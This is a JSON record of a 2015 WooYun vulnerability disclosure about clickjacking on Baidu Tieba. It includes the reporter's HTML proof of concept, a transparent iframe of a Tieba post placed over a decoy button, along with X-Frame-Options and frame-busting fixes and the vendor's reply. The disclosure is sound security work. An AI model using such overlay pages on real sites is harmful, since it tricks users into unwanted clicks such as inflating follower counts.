{"id": 37840, "wybug_id": "wooyun-2015-098802", "wybug_title": "百度贴吧点击劫持(可恶意刷粉丝)", "wybug_corp": "百度", "wybug_author": "marshal", "wybug_date": "2015-03-02 11:52", "wybug_open_date": "2015-04-16 11:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向公众公开  简要描述： 百度贴吧没考虑点击劫持防御，可造成恶意刷粉丝。估计很多地方都没考虑，还可以继续挖。 详细说明：  点击劫持（ClickJacking）是由互联网安全专家罗伯特.汉森和耶利米.格劳斯在2008年首创的。是一种视觉欺骗手段，在Web端就是Iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。百度贴吧页面没考虑该漏洞，可以导致恶意刷粉丝。想象一下，我在某个大号下留个劲爆消息，诱导用户到我的域名点击按钮，最后大家都成我贴吧的粉丝了。   漏洞证明：  \n\n我的本地页面代码：<html>    <head>        <meta charset=\"utf-8\" />        <title>demo</title>    </head>    <div style=\"z-index:999;opacity:0.0;width:2000px; height:2500px;overflow:hidden;position:absolute;\">        <iframe id=\"inner\" style=\"position:absolute;top:0px;width:1500px;height:1500px;left:0px;\" src=\"http://tieba.baidu.com/p/3564916309\"></iframe>    </div>    <button id=\"click\" style=\"cursor:pointer;z-index:10px;position:absolute;top:235px;left:438px;text-align:center;width:84px;height:35px;\">点我试试</button></html>   修复方案：  一、X-FRAME-OPTIONSX-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。这个头有三个值：DENY               // 拒绝任何域加载SAMEORIGIN         // 允许同源域下加载ALLOW-FROM         // 可以定义允许frame加载的页面地址php中设置示例：header ( \"X-FRAME-OPTIONS:DENY\");二、目前最好的js的防御方案为：<head><style> body { display : none;} </style></head><body><script>if (self == top) {    var theBody = document.getElementsByTagName('body')[0];    theBody.style.display = \"block\";} else {    top.location = self.location;}</script>具体原理请参考乌云知识库：http://drops.wooyun.org/papers/104   版权声明：转载请注明来源 marshal@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-03-02 21:22 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}